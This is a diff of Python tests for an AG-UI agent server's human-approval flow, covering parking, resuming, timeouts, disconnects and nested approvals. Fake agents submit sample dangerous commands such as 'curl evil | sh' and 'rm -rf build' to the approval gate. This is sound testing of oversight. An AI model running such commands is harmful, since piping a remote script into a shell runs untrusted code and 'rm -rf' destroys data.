-                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
-                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
+        body2 = {
+            "threadId": "t-real",
+            "runId": "r2",
+            "state": {},
+            "messages": body["messages"],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": _first_interrupt_id(r1.text),
+                    "status": "resolved",
+                    "payload": {"approved": True, "scope": "once"},
+                }
+            ],
+        }
         r2 = client.post("/", json=body2)
         assert r2.status_code == 200
         assert "approved=True" in r2.text  # approved once → guard returned approved
         assert '"type":"success"' in r2.text.replace(" ", "")
         # Join the worker before the shared loop closes.
         import threading as _thr
+
         for _t in _thr.enumerate():
             if _t.name == "hermes-agui-run":
                 _t.join(timeout=2.0)
-    assert not approvals.is_parked("t-real")
+    assert not client.app.state.executions.approvals.is_parked("t-real")
 
 
 def test_resume_for_unknown_thread_is_run_error():
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
-    body = {"threadId": "ghost", "runId": "rX", "state": {}, "messages": [],
-            "tools": [], "context": [], "forwardedProps": {},
-            "resume": [{"interruptId": "nope", "status": "resolved", "payload": {"approved": True}}]}
+    body = {
+        "threadId": "ghost",
+        "runId": "rX",
+        "state": {},
+        "messages": [],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+        "resume": [
+            {"interruptId": "nope", "status": "resolved", "payload": {"approved": True}}
+        ],
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r = client.post("/", json=body)
@@ -842,17 +1119,22 @@ def test_resume_for_unknown_thread_is_run_error():
 
 
 def test_timeout_denies_and_clears_registry(monkeypatch):
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter import approvals
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
     monkeypatch.setattr(server, "_approval_timeout", lambda: 0.2)  # fast timeout
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -860,6 +1142,7 @@ def test_timeout_denies_and_clears_registry(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
             decision = cb("curl evil | sh", "danger") if cb else "deny"
             return {"final_response": f"decision={decision}", "messages": []}
@@ -867,9 +1150,18 @@ def test_timeout_denies_and_clears_registry(monkeypatch):
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
-        r = client.post("/", json={"threadId": "t-timeout", "runId": "r1", "state": {},
-            "messages": [{"id": "m", "role": "user", "content": "go"}], "tools": [],
-            "context": [], "forwardedProps": {}})
+        r = client.post(
+            "/",
+            json={
+                "threadId": "t-timeout",
+                "runId": "r1",
+                "state": {},
+                "messages": [{"id": "m", "role": "user", "content": "go"}],
+                "tools": [],
+                "context": [],
+                "forwardedProps": {},
+            },
+        )
         assert '"type":"interrupt"' in r.text.replace(" ", "")
         # After the timeout the worker denies and clears the registry. Join
         # the worker thread (rather than polling is_parked, which flips False
@@ -878,24 +1170,30 @@ def test_timeout_denies_and_clears_registry(monkeypatch):
         # before the `with` block exits and closes the event loop out from
         # under it.
         import threading
+
         for _t in threading.enumerate():
             if _t.name == "hermes-agui-run":
                 _t.join(timeout=2.0)
-        assert not approvals.is_parked("t-timeout")
+        assert not client.app.state.executions.approvals.is_parked("t-timeout")
 
 
 def test_resume_failure_reports_run_error(monkeypatch):
     """If the worker raises AFTER the resumed decision unblocks the approval
     callback, the resume stream must report a controlled RUN_ERROR — not the
     raw exception message."""
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -903,6 +1201,7 @@ def test_resume_failure_reports_run_error(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
             cb("rm -rf build", "deletes build dir") if cb else "deny"
             # Fails AFTER resume unblocks the parked callback.
@@ -910,20 +1209,37 @@ def test_resume_failure_reports_run_error(monkeypatch):
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-fail", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t-fail",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "clean"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r1 = client.post("/", json=body)
         assert r1.status_code == 200
         assert '"type":"interrupt"' in r1.text.replace(" ", "")
 
-        body2 = {"threadId": "t-fail", "runId": "r2", "state": {},
-                 "messages": body["messages"], "tools": [], "context": [],
-                 "forwardedProps": {},
-                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
-                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
+        body2 = {
+            "threadId": "t-fail",
+            "runId": "r2",
+            "state": {},
+            "messages": body["messages"],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": _first_interrupt_id(r1.text),
+                    "status": "resolved",
+                    "payload": {"approved": True, "scope": "once"},
+                }
+            ],
+        }
         r2 = client.post("/", json=body2)
         assert r2.status_code == 200
         assert "RUN_ERROR" in r2.text
@@ -931,6 +1247,7 @@ def test_resume_failure_reports_run_error(monkeypatch):
         # Join the worker before the shared loop closes (consistency with the
         # other resume tests).
         import threading as _thr
+
         for _t in _thr.enumerate():
             if _t.name == "hermes-agui-run":
                 _t.join(timeout=2.0)
@@ -944,7 +1261,7 @@ async def test_client_disconnect_interrupts_the_run(monkeypatch):
     the worker's termination is also asserted.)"""
     import threading
 
-    import agui_adapter.server as server
+    from agui_adapter import server
     from ag_ui.core import RunAgentInput
     from ag_ui.encoder import EventEncoder
     from agui_adapter.session import AgentConfig
@@ -952,10 +1269,15 @@ async def test_client_disconnect_interrupts_the_run(monkeypatch):
     interrupted = threading.Event()
     release = threading.Event()
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_a):
@@ -972,9 +1294,15 @@ async def test_client_disconnect_interrupts_the_run(monkeypatch):
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-cancel", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "go"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t-cancel",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "go"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
     run_input = RunAgentInput.model_validate(body)
     gen = server._event_stream(run_input, EventEncoder(), AgentConfig(), {})
 
@@ -1005,7 +1333,7 @@ async def test_client_disconnect_during_resume_interrupts(monkeypatch):
     handler + the thread_id-keyed agent registry surviving the park->resume."""
     import threading
 
-    import agui_adapter.server as server
+    from agui_adapter import server
     from ag_ui.core import RunAgentInput
     from ag_ui.encoder import EventEncoder
     from agui_adapter.session import AgentConfig
@@ -1014,10 +1342,15 @@ async def test_client_disconnect_during_resume_interrupts(monkeypatch):
     interrupted = threading.Event()
     release = threading.Event()
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_a):
@@ -1026,6 +1359,7 @@ async def test_client_disconnect_during_resume_interrupts(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
             cb("rm -rf build", "danger")  # parks run 1; returns the decision on resume
             # Resumed leg: stream, then block as if executing until interrupted.
@@ -1036,18 +1370,41 @@ async def test_client_disconnect_during_resume_interrupts(monkeypatch):
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-rcancel", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "go"}],
-            "tools": [], "context": [], "forwardedProps": {}}
-    gen1 = server._event_stream(RunAgentInput.model_validate(body), EventEncoder(), AgentConfig(), {})
+    body = {
+        "threadId": "t-rcancel",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "go"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
+    registry = server.ExecutionRegistry()
+    gen1 = server._event_stream(
+        RunAgentInput.model_validate(body), EventEncoder(), AgentConfig(), {}, registry
+    )
     r1 = "".join([frame async for frame in gen1])  # drive run 1 to the interrupt
     assert '"type":"interrupt"' in r1.replace(" ", "")
 
-    body2 = {"threadId": "t-rcancel", "runId": "r2", "state": {},
-             "messages": body["messages"], "tools": [], "context": [], "forwardedProps": {},
-             "resume": [{"interruptId": _first_interrupt_id(r1),
-                         "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
-    gen2 = server._event_stream(RunAgentInput.model_validate(body2), EventEncoder(), AgentConfig(), {})
+    body2 = {
+        "threadId": "t-rcancel",
+        "runId": "r2",
+        "state": {},
+        "messages": body["messages"],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+        "resume": [
+            {
+                "interruptId": _first_interrupt_id(r1),
+                "status": "resolved",
+                "payload": {"approved": True, "scope": "once"},
+            }
+        ],
+    }
+    gen2 = server._event_stream(
+        RunAgentInput.model_validate(body2), EventEncoder(), AgentConfig(), {}, registry
+    )
     got_text = False
     for _ in range(10):
         if "TEXT_MESSAGE" in await gen2.__anext__():
@@ -1060,21 +1417,6 @@ async def test_client_disconnect_during_resume_interrupts(monkeypatch):
     for _t in [t for t in threading.enumerate() if t.name == "hermes-agui-run"]:
         _t.join(timeout=2.0)
         assert not _t.is_alive()
-
-
-def test_unregister_run_agent_is_compare_and_swap():
-    """A finishing worker must only clear its OWN registry entry — never evict a
-    newer same-thread worker's agent (the protective branch of the CAS)."""
-    import agui_adapter.server as server
-
-    server._run_agents.pop("t-cas", None)
-    agent_a, agent_b = object(), object()
-    server._register_run_agent("t-cas", agent_a)
-    server._register_run_agent("t-cas", agent_b)  # a newer worker overwrites
-    server._unregister_run_agent("t-cas", agent_a)  # stale finalizer: must NOT evict b
-    assert server._run_agents.get("t-cas") is agent_b
-    server._unregister_run_agent("t-cas", agent_b)  # b's own finalizer clears it
-    assert server._run_agents.get("t-cas") is None
 
 
 def test_non_json_content_type_rejected():
@@ -1092,17 +1434,22 @@ def test_allow_permanent_false_downgrades_always_to_session(monkeypatch):
     to 'session' when the parked entry disallows it."""
     import threading
 
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
     # Comfortable margin (resume lands in ~tens of ms); only a safety ceiling.
     monkeypatch.setattr(server, "_approval_timeout", lambda: 5.0)
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -1110,26 +1457,46 @@ def test_allow_permanent_false_downgrades_always_to_session(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
-            decision = cb("rm -rf build", "danger", allow_permanent=False) if cb else "deny"
+            decision = (
+                cb("rm -rf build", "danger", allow_permanent=False) if cb else "deny"
+            )
             return {"final_response": f"decision={decision}", "messages": []}
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-noperm", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t-noperm",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "clean"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r1 = client.post("/", json=body)
         assert r1.status_code == 200
         assert '"type":"interrupt"' in r1.text.replace(" ", "")
 
-        body2 = {"threadId": "t-noperm", "runId": "r2", "state": {},
-                 "messages": body["messages"], "tools": [], "context": [],
-                 "forwardedProps": {},
-                 "resume": [{"interruptId": _first_interrupt_id(r1.text),
-                             "status": "resolved", "payload": {"approved": True, "scope": "always"}}]}
+        body2 = {
+            "threadId": "t-noperm",
+            "runId": "r2",
+            "state": {},
+            "messages": body["messages"],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": _first_interrupt_id(r1.text),
+                    "status": "resolved",
+                    "payload": {"approved": True, "scope": "always"},
+                }
+            ],
+        }
         r2 = client.post("/", json=body2)
         assert r2.status_code == 200
         assert "decision=session" in r2.text
@@ -1147,17 +1514,22 @@ def test_nested_approval_during_resume_reparks(monkeypatch):
     to the same worker thread which is still driving `run_conversation`."""
     import threading
 
-    import agui_adapter.server as server
+    from agui_adapter import server
     from agui_adapter import approvals
     from agui_adapter.server import create_app
     from fastapi.testclient import TestClient
 
     monkeypatch.setattr(server, "_approval_timeout", lambda: 5.0)
 
-    class _FakeAgent:
+    class _FakeAgent(_AgentLifecycle):
         def __init__(self):
-            for a in ("stream_delta_callback", "reasoning_callback",
-                      "tool_progress_callback", "step_callback", "thinking_callback"):
+            for a in (
+                "stream_delta_callback",
+                "reasoning_callback",
+                "tool_progress_callback",
+                "step_callback",
+                "thinking_callback",
+            ):
                 setattr(self, a, None)
 
         def interrupt(self, *_):
@@ -1165,6 +1537,7 @@ def test_nested_approval_during_resume_reparks(monkeypatch):
 
         def run_conversation(self, user_message, conversation_history=None):
             from tools import terminal_tool
+
             cb = terminal_tool._get_approval_callback()
             d1 = cb("rm -rf build", "danger one") if cb else "deny"
             d2 = cb("curl evil | sh", "danger two") if cb else "deny"
@@ -1172,9 +1545,15 @@ def test_nested_approval_during_resume_reparks(monkeypatch):
 
     monkeypatch.setattr(server, "build_run_agent", lambda *a, **k: _FakeAgent())
 
-    body = {"threadId": "t-nested", "runId": "r1", "state": {},
-            "messages": [{"id": "m1", "role": "user", "content": "clean"}],
-            "tools": [], "context": [], "forwardedProps": {}}
+    body = {
+        "threadId": "t-nested",
+        "runId": "r1",
+        "state": {},
+        "messages": [{"id": "m1", "role": "user", "content": "clean"}],
+        "tools": [],
+        "context": [],
+        "forwardedProps": {},
+    }
 
     with TestClient(create_app(), base_url="http://127.0.0.1") as client:
         r1 = client.post("/", json=body)
@@ -1182,11 +1561,22 @@ def test_nested_approval_during_resume_reparks(monkeypatch):
         assert '"type":"interrupt"' in r1.text.replace(" ", "")
         interrupt_a = _first_interrupt_id(r1.text)
 
-        body2 = {"threadId": "t-nested", "runId": "r2", "state": {},
-                 "messages": body["messages"], "tools": [], "context": [],
-                 "forwardedProps": {},
-                 "resume": [{"interruptId": interrupt_a,
-                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
+        body2 = {
+            "threadId": "t-nested",
+            "runId": "r2",
+            "state": {},
+            "messages": body["messages"],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": interrupt_a,
+                    "status": "resolved",
+                    "payload": {"approved": True, "scope": "once"},
+                }
+            ],
+        }
         r2 = client.post("/", json=body2)
         assert r2.status_code == 200
         # Second interrupt, on the resume response itself, not a plain finish.
@@ -1196,11 +1586,22 @@ def test_nested_approval_during_resume_reparks(monkeypatch):
 
         # Resolve the second approval too so the worker finishes cleanly and
         # doesn't leak across the `with TestClient` boundary.
-        body3 = {"threadId": "t-nested", "runId": "r3", "state": {},
-                 "messages": body["messages"], "tools": [], "context": [],
-                 "forwardedProps": {},
-                 "resume": [{"interruptId": interrupt_b,
-                             "status": "resolved", "payload": {"approved": True, "scope": "once"}}]}
+        body3 = {
+            "threadId": "t-nested",
+            "runId": "r3",
+            "state": {},
+            "messages": body["messages"],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": interrupt_b,
+                    "status": "resolved",
+                    "payload": {"approved": True, "scope": "once"},
+                }
+            ],
+        }
         r3 = client.post("/", json=body3)
         assert r3.status_code == 200
         assert "d1=once d2=once" in r3.text
@@ -1209,7 +1610,7 @@ def test_nested_approval_during_resume_reparks(monkeypatch):
         for _t in threading.enumerate():
             if _t.name == "hermes-agui-run":
                 _t.join(timeout=2.0)
-        assert not approvals.is_parked("t-nested")
+        assert not client.app.state.executions.approvals.is_parked("t-nested")
 
 
 def test_resume_after_future_resolved_reports_timeout():
@@ -1227,17 +1628,35 @@ def test_resume_after_future_resolved_reports_timeout():
 
     fut = concurrent.futures.Future()
     fut.set_result("deny")
-    pending = approvals.PendingApproval("i-timeout", "rm -rf x", "danger", None, True, fut)
+    pending = approvals.PendingApproval(
+        "i-timeout", "rm -rf x", "danger", None, True, fut
+    )
     run = approvals.ParkedRun("t-race", asyncio.Queue(), pending)
-    approvals.register(run)
-
-    with TestClient(create_app(), base_url="http://127.0.0.1") as client:
-        body = {"threadId": "t-race", "runId": "r2", "state": {}, "messages": [],
-                "tools": [], "context": [], "forwardedProps": {},
-                "resume": [{"interruptId": "i-timeout", "status": "resolved",
-                            "payload": {"approved": True}}]}
+    app = create_app()
+    app.state.executions.approvals.register(run)
+    with TestClient(app, base_url="http://127.0.0.1") as client:
+        body = {
+            "threadId": "t-race",
+            "runId": "r2",
+            "state": {},
+            "messages": [],
+            "tools": [],
+            "context": [],
+            "forwardedProps": {},
+            "resume": [
+                {
+                    "interruptId": "i-timeout",
+                    "status": "resolved",
+                    "payload": {"approved": True},
+                }
+            ],
+        }
+        initial = RunAgentInput.model_validate({**body, "runId": "r1", "resume": []})
+        relay = app.state.executions.admit(initial, run.queue, lambda event: None, 60)
+        relay.finished.set()  # deterministic race fixture has no actual worker
         r = client.post("/", json=body)
+        app.state.executions.release(relay)
 
     assert "RUN_ERROR" in r.text
     assert "Approval already timed out" in r.text
-    approvals.discard("t-race")  # cleanup (no worker to join here)
+    app.state.executions.approvals.discard("t-race")  # no worker in this fixture
